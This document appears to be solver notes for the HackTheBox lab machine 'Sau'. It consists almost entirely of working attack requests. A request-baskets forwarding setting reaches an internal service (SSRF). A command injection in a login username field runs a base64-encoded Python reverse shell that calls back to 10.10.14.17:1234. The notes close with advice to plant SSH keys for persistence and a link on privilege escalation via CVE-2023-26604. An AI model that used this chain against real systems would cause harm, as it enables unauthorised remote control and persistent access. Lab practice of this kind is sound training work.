## Solver

POST /api/baskets/postmal HTTP/1.1
Host: sau.htb:55555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Authorization: null
X-Requested-With: XMLHttpRequest
Origin: http://sau.htb:55555
Connection: close
Referer: http://sau.htb:55555/web
Content-Length: 121

{"forward_url":"http://127.0.0.1:80/login","proxy_response":true,"insecure_tls":false,"expand_path":false,"capacity":200}

POST /postmal HTTP/1.1
Host: sau.htb:55555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 42

username=;`echo+'cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMTciLDEyMzQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw=='|base64+-d|bash`

After getting reverse shell, add ssh authorized keys to better reconnect

Privesc

https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7